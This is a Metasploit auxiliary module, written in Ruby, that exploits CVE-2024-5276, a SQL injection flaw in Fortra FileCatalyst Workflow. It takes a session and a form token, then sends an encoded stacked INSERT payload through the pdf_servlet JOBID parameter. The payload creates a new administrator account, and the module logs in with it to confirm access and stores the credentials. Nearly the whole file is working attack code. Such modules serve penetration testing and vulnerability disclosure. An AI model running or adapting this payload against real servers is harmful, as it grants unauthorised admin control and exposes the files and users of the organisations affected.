require 'digest/md5'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Fortra FileCatalyst Workflow SQL Injection (CVE-2024-5276)',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in Fortra FileCatalyst Workflow <= v5.1.6 Build 135, by adding a new
          administrative user to the web interface of the application.
        },
        'Author' => [
          'Tenable', # Discovery and PoC
          'Michael Heinzl' # MSF Module
        ],
        'References' => [
          ['CVE', '2024-5276'],
          ['URL', 'https://www.tenable.com/security/research/tra-2024-25'],
          ['URL', 'https://support.fortra.com/filecatalyst/kb-articles/advisory-6-24-2024-filecatalyst-workflow-sql-injection-vulnerability-YmYwYWY4OTYtNTUzMi1lZjExLTg0MGEtNjA0NWJkMDg3MDA0']
        ],
        'DisclosureDate' => '2024-06-25',
        'DefaultOptions' => {
          'RPORT' => 8080
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username]),
      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alphanumeric(16)]),
      OptString.new('NEW_EMAIL', [true, 'E-mail to be used when creating a new user with admin privileges', Faker::Internet.email])
    ])
  end

  def run
    print_status('Starting SQL injection workflow...')

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'workflow/')
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.')
    end
    print_good('Server reachable.')

    raw_res = res.to_s
    unless raw_res =~ /JSESSIONID=(\w+);/
      fail_with(Failure::UnexpectedReply, 'JSESSIONID not found.')
    end

    jsessionid = ::Regexp.last_match(1)
    print_status("JSESSIONID value: #{jsessionid}")

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "workflow/jsp/logon.jsp;jsessionid=#{jsessionid}"),
      'headers' => {
        'Cookie' => "JSESSIONID=#{jsessionid}"
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    body = res.body
    unless body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
      fail_with(Failure::UnexpectedReply, 'FCWEB.FORM.TOKEN not found.')
    end

    token_value = ::Regexp.last_match(1)
    print_status("FCWEB.FORM.TOKEN value: #{token_value}")

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "workflow/logonAnonymous.do?FCWEB.FORM.TOKEN=#{token_value}"),
      'headers' => {
        'Cookie' => "JSESSIONID=#{jsessionid}"
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    unless res.headers['Location']
      fail_with(Failure::UnexpectedReply, 'Location header not found.')
    end

    location_value = res.headers['Location']
    print_status("Redirect #1: #{location_value}")

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, location_value.to_s),
      'headers' => {
        'Cookie' => "JSESSIONID=#{jsessionid}"
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    unless res.headers['Location']
      fail_with(Failure::UnexpectedReply, 'Location header not found.')
    end

    location_value = res.headers['Location']
    print_status("Redirect #2: #{location_value}")

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, location_value.to_s),
      'headers' => {
        'Cookie' => "JSESSIONID=#{jsessionid}"
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    html = res.get_html_document
    h2_tag = html.at_css('h2')

    unless h2_tag
      fail_with(Failure::UnexpectedReply, 'h2 tag not found.')
    end

    h2_text = h2_tag.text.strip
    unless h2_text == 'Choose an Order Type'
      fail_with(Failure::UnexpectedReply, 'Unexpected string found inside h2 tag: ' + h2_text)
    end

    print_status('Received expected response.')

    t = Time.now
    username = datastore['NEW_USERNAME']
    password = Digest::MD5.hexdigest(datastore['NEW_PASSWORD']).upcase
    email = datastore['NEW_EMAIL']
    firstname = Faker::Name.first_name
    lastname = Faker::Name.last_name
    areacode = rand(100..999)
    exchangecode = rand(100..999)
    subscribernumber = rand(1000..9999)
    phone = format('(%<areacode>03d) %<exchangecode>03d-%<subscribernumber>04d',
                   areacode: areacode,
                   exchangecode: exchangecode,
                   subscribernumber: subscribernumber)
    creation = "+#{t.strftime('%s%L')}"
    pw_creationdate = "+#{t.strftime('%s%L')}"
    lastlogin = "+#{t.strftime('%s%L')}"

    vprint_status('Adding New Admin User:')
    vprint_status("\tUsername: #{username}")
    vprint_status("\tPassword: #{datastore['NEW_PASSWORD']} (#{password})")
    vprint_status("\tEmail: #{email}")
    vprint_status("\tFirstName: #{firstname}")
    vprint_status("\tLastName: #{lastname}")
    vprint_status("\tPhone: #{phone}")
    vprint_status("\tCreation: #{creation}")
    vprint_status("\tPW_CreationDate: #{pw_creationdate}")
    vprint_status("\tLastLogin: #{lastlogin}")

    payload = '1%27%3BINSERT+INTO+DOCTERA_USERS+%28USERNAME%2C+PASSWORD%2C+ENCPASSWORD%2C+FIRSTNAME%2C+LASTNAME%2C+COMPANY%2C' \
              'ADDRESS%2C+ADDRESS2%2C+CITY%2C+STATE%2C+ALTPHONE%2C+ZIP%2C+COUNTRY%2C+PHONE%2C+FAX%2C+EMAIL%2C+LASTLOGIN%2C' \
              'CREATION%2C+PREFERREDSERVER%2C+CREDITCARDTYPE%2C+CREDITCARDNUMBER%2C+CREDITCARDEXPIRY%2C+ACCOUNTSTATUS%2C+USERTYPE%2C' \
              'COMMENT%2C+ADMIN%2C+SUPERADMIN%2C+ACCEPTEMAIL%2C+ALLOWHOTFOLDER%2C+PROTOCOL%2C+BANDWIDTH%2C+DIRECTORY%2C+SLOWSTARTRATE%2C' \
              'USESLOWSTART%2C+SLOWSTARTAGGRESSIONRATE%2C+BLOCKSIZE%2C+UNITSIZE%2C+NUMENCODERS%2C+NUMFTPSTREAMS%2C+ALLOWUSERBANDWIDTHTUNING%2C' \
              'EXPIRYDATE%2C+ALLOWTEMPACCOUNTCREATION%2C+OWNERUSERNAME%2C+USERLEVEL%2C+UPLOADMETHOD%2C+PW_CHANGEABLE%2C+PW_CREATIONDATE%2C' \
              "PW_DAYSBEFOREEXPIRE%2C+PW_MUSTCHANGE%2C+PW_USEDPASSWORDS%2C+PW_NUMERRORS%29+VALUES%28%27#{username}%27%2C+NULL%2C+" \
              "%27#{password}%27%2C+%27#{firstname}%27%2C+%27#{lastname}%27%2C+%27%27%2C+" \
              '%27%27%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27202-404-2400%27%2C+%27%27%2C+' \
              "%27#{email}%27%2C#{lastlogin}%2C#{creation}%2C+%27default%27%2C+%27%27%2C+%27%27%2C+" \
              '%27%27%2C+%27full+access%27%2C+%27%27%2C+%27%27%2C+1%2C+0%2C+0%2C+0%2C+%27DEFAULT%27%2C+%270%27%2C+0%2C+' \
              '%270%27%2C+1%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27%2C+0%2C+0%2C+0%2C+%27%27%2C+0%2C+' \
              "%27DEFAULT%27%2C+0%2C#{pw_creationdate}%2C+-1%2C+0%2C+NULL%2C+0%29%3B--+-"

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "workflow/servlet/pdf_servlet?JOBID=#{payload}"),
      'headers' => {
        'Cookie' => "JSESSIONID=#{jsessionid}"
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    fail_with(Failure::UnexpectedReply, "Unexpected HTTP code from the target: #{res.code}") unless res.code == 200
    fail_with(Failure::UnexpectedReply, 'Unexpected reply from the target.') unless res.body.to_s == ''
    print_good('SQL injection successful!')

    print_status('Confirming credentials...')

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'workflow/jsp/logon.jsp'),
      'headers' => {
        'Cookie' => "JSESSIONID=#{jsessionid}"
      }
    )

    fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.') unless res

    body = res.body
    unless body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
      fail_with(Failure::UnexpectedReply, 'FCWEB.FORM.TOKEN not found.')
    end

    token_value = ::Regexp.last_match(1)
    print_status("FCWEB.FORM.TOKEN value: #{token_value}")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'workflow/logon.do'),
      'headers' => {
        'Cookie' => "JSESSIONID=#{jsessionid}",
        'Content-Type' => 'application/x-www-form-urlencoded'
      },
      'vars_post' => {
        'username' => datastore['NEW_USERNAME'],
        'password' => datastore['NEW_PASSWORD'],
        'FCWEB.FORM.TOKEN' => token_value.to_s,
        'submit' => 'Login'
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    html = res.get_html_document
    title_block = html.at_css('.titleBlock')

    unless title_block
      fail_with(Failure::UnexpectedReply, 'Expected titleBlock not found.')
    end
    title_text = title_block.text.strip

    unless title_text.include?('Administration')
      fail_with(Failure::UnexpectedReply, 'Expected string "Administration" not found.')
    end
    store_valid_credential(user: datastore['NEW_USERNAME'], private: datastore['NEW_PASSWORD'], proof: html)
    print_good('Login successful!')

    print_good("New admin user was successfully injected:\n\t#{datastore['NEW_USERNAME']}:#{datastore['NEW_PASSWORD']}")
    print_good("Login at: #{full_uri(normalize_uri(target_uri, 'workflow/jsp/logon.jsp'))}")
  end

end
